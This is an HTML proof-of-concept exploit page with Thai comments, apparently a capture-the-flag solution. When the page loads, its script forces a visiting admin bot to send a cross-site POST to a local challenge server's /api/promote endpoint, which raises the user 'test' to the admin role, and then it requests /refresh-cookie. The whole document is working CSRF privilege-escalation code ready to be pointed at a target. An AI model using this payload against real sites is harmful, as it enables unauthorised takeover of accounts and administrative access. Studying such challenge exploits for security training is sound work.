<!DOCTYPE html>
<html>

<head>
    <title>Exploit POC</title>
</head>

<body>
    <h1>Exploit Running...</h1>
    <script>
        async function pwn() {
            // สำคัญมาก: เปลี่ยนเป็น URL ของเว็บโจทย์ที่คุณได้มาจากตัวรัน (เช่น http://127.0.0.1:56366 หรือ IP ที่เซิร์ฟเวอร์เปิดไว้)
            const targetBase = "http://127.0.0.1:52732/";

            try {
                // 1. สั่งให้ Admin บอทช่วยโปรโมตยูสเซอร์ของคุณ (เช่น ยูสเซอร์ "test") ให้เป็น admin
                const res = await fetch(targetBase + "/api/promote", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        user: "test",       // ชื่อยูสเซอร์ที่คุณสมัครไว้บนเว็บโจทย์
                        role: "admin"       // ให้แอดมินเปลี่ยนเป็น admin ให้
                    })
                });
                const data = await res.json();
                console.log("Promote result:", data);

                // 2. สั่งรีเซ็ตคุกกี้เพื่อให้เซสชันอัปเดตสิทธิ์ใหม่
                await fetch(targetBase + "/refresh-cookie", {
                    method: "GET"
                });
            } catch (e) {
                console.error("Error:", e);
            }
        }
        pwn();
    </script>
</body>

</html>
